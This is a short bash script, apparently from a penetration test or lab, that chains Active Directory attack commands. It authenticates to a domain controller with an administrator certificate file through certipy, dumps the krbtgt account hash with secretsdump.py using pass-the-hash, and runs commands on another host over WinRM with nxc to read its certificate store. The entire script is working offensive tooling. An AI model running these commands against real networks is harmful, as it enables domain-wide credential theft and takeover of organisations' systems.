#!/bin/bash
PFX=admin_cert.pfx
certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt
secretsdump.py -just-dc-user krbtgt -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.example/administrator@10.20.1.5
nxc winrm 10.20.1.23 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "certutil -store My" > 20250301_104030_ca_store.txt
